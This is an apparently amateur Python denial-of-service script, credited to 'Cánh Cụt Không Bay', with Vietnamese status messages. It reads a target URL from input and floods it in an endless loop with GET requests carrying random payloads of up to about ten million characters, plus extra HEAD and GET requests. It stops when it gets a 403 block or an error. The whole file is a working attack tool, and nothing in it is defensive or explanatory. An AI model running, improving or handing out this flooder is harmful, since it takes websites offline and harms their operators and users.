import requests
import aiohttp
import asyncio
import random
import string
import ssl

url = input("url: ")

def generate_random_payload():
    length = random.randint(1, 9999999)
    text_characters = string.ascii_letters + string.digits + string.punctuation
    payload = "".join(random.choice(text_characters) for i in range(length))
    return payload

async def attack(target):
    print("Dos Get - method by Cánh Cụt Không Bay")
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "User-agent": "hello, world!!!",
    }

    while True:
        try:
            x = requests.get(target, headers=headers, params={"payload": generate_random_payload()}, timeout=3)
            if x.status_code == 200:
                print("OK, tấn công")
                session = aiohttp.ClientSession()
                context = ssl.create_default_context()
                async with session.head(target, cookies=x.cookies, ssl=context) as response:
                    await response.text()
                test = requests.get(target)
                print("testing request:", test.status_code)
                await asyncio.sleep(0.1)
            elif x.status_code == 403:
                print("Block IP !!!")
                break
            elif x.status_code >= 500:
                print("False back!!!, attack phụ")
                session = aiohttp.ClientSession()
                async with session.get(target) as response:
                    await response.text()
                    await response.release()
        except requests.exceptions.RequestException as e:
            print("Error:", e)
            break

asyncio.run(attack(url))
